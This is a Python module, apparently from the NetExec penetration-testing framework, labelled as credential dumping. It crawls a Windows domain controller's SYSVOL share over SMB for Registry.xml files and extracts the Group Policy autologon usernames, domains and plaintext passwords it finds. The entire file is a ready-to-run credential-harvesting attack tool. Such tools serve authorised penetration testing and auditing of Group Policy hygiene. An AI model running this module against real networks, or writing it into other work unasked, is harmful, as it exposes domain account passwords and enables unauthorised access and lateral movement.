import xml.etree.ElementTree as ET
from io import BytesIO
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    Reference: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1
    Module by @byt3bl33d3r
    """

    name = "gpp_autologin"
    description = "Searches the domain controller for registry.xml to find autologon information and returns the username and password."
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """No options available."""

    def on_login(self, context, connection):
        context.log.display("Searching SYSVOL share for Registry.xml")

        paths = connection.spider("SYSVOL", pattern=["Registry.xml"])
        for path in paths:
            context.log.display(f"Found {path}")

            buf = BytesIO()
            connection.conn.getFile("SYSVOL", path, buf.write)
            xml = ET.fromstring(buf.getvalue())

            if xml.findall('.//Properties[@name="DefaultPassword"]'):
                usernames = []
                passwords = []
                domains = []

                xml_section = xml.findall(".//Properties")

                for section in xml_section:
                    attrs = section.attrib

                    if attrs["name"] == "DefaultPassword":
                        passwords.append(attrs["value"])

                    if attrs["name"] == "DefaultUserName":
                        usernames.append(attrs["value"])

                    if attrs["name"] == "DefaultDomainName":
                        domains.append(attrs["value"])

                if usernames or passwords:
                    context.log.success(f"Found credentials in {path}")
                    context.log.highlight(f"Usernames: {usernames}")
                    context.log.highlight(f"Domains: {domains}")
                    context.log.highlight(f"Passwords: {passwords}")
